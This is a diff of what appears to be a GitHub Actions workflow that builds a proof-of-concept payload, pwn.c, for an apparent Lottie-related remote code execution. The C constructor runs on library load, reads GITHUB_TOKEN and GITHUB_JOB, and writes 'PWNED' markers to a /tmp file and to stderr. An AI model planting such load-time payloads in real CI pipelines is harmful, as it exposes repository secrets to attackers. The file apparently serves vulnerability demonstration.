@@ -11,11 +11,13 @@ jobs:
           mkdir -p stage
           cat > pwn.c <<'C'
           #include <stdio.h>
+          #include <stdlib.h>
           #include <unistd.h>
           __attribute__((constructor)) static void p(void) {
             const char *e = getenv("GITHUB_TOKEN");
+            const char *j = getenv("GITHUB_JOB");
             FILE *f = fopen("/tmp/lottie_rce.txt", "a");
-            if (f) { fprintf(f, "PWNED_LOTTIE_RCE pid=%d job=%s token_present=%s\n", getpid(), getenv("GITHUB_JOB") ? getenv("GITHUB_JOB") : "?", e ? "yes" : "no"); fclose(f); }
+            if (f) { fprintf(f, "PWNED_LOTTIE_RCE pid=%d job=%s token_present=%s\n", getpid(), j ? j : "?", e ? "yes" : "no"); fclose(f); }
             fprintf(stderr, "PWNED_LOTTIE_RCE_MARKER pid=%d token_present=%s\n", getpid(), e ? "yes" : "no");
           }
           C
